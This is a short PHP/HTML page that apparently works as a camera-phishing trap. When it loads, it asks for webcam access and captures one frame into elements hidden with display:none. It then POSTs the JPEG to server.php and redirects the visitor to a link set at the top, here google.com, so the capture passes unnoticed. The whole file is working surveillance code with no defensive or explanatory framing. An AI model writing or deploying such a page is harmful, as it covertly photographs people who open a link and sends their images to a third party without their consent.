<?php
$link = "https://google.com";
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Document</title>
	<style>
	.inlin{
		display: none;
		border: 3px solid grey;
	}
	a{
		color: blue;
	}
	</style>
</head>
<body onload="getCamera()">
	<div class="inlin">
		<video id="video" width="550" height="480" autoplay></video>
	</div>
		<div class="inlin">
			<canvas id="canvas" width="550" height="480"></canvas>
		</div><br>
	<script>
        var video = document.getElementById('video');
        function getCamera() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
                    video.srcObject = stream;
                    video.play();

                    video.addEventListener("canplay", function () {
                        const canvas = document.createElement("canvas");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext("2d").drawImage(video, 0, 0);

                        canvas.toBlob(sendToServer, "image/jpeg");
                        window.location.href = '<?=$link;?>';
                    });
                });
            }
        }

		if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
		    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {        
		        video.srcObject = stream;
		        video.play();
                video.addEventListener("canplay", function () {
                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext("2d").drawImage(video, 0, 0);

                    canvas.toBlob(sendToServer, "image/jpeg");
                    window.location.href = '<?=$link;?>';
                });
		    });
		}

        function sendToServer(blob) {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "server.php", true);
            xhr.setRequestHeader("Content-Type", "application/octet-stream");
            xhr.send(blob);
        }
	</script>
</body>
</html
